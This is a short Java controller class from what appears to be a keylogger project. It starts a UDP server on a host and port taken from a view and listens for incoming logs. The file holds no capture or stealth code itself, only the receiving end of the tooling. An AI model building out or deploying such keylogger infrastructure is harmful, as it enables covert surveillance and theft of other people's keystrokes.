package com.hao.keylogger.controllers;

import com.hao.keylogger.models.Log;
import com.hao.keylogger.views.ServerView;

public class ServerLogController {
	ServerView view;
	Log log;
	UDPServerHelper udpServerHelper;
	
	public ServerLogController(ServerView view, Log log) {
		this.view = view;
		this.log = log;
		view.setController(this);
	}

	public boolean startServer() {
		String hostName = view.getHost();
		int port = view.getPort();
		udpServerHelper = UDPServerHelper.getInstance(hostName, port);
		if (udpServerHelper.startServer()) {
			startListenning();
			return true;
		}		
		return false;
	}

	private void startListenning() {
		udpServerHelper.startListenning();
	}

}
